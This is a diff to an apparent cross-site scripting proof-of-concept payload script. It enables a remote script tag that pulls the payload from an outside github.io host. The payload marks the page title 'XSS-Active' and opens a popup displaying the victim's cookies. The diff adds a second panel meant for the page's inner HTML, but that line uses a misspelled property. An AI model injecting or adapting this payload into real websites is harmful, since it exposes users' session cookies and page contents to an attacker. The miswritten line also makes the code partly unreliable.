@@ -1,4 +1,4 @@
-//<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 
+<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 
 //BEGIN - Update Title for confirmation script loaded
 document.title = "XSS-Active"
 //Put Back the variable used to invoke the XSS
@@ -26,8 +26,22 @@ popup.document.title = "XSS Data";
 //Cookie Doc
 var txtCookie = popup.document.createElement("TEXTAREA");
 txtCookie.innerHTML = UsersCookie;
-txtCookie.style = "width:100%;height:300px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+txtCookie.style = "width:100%;height:150px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
 popup.document.body.appendChild(txtCookie);
+
+//Doc Header
+var hDocumentInner = popup.document.createElement("h4");
+hDocumentInner.style = "color:fff;";
+hDocumentInner.innerHTML = "Document Inneer HTML";
+popup.document.body.appendChild(hDocumentInner);
+
+//Cookie Doc
+var txtDocumentInner = popup.document.createElement("TEXTAREA");
+txtDocumentInner.innerHTML = document.innerhtml;
+txtDocumentInner.style = "width:100%;height:150px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+popup.document.body.appendChild(txtDocumentInner);
+
+
 
 }
 createPopup();
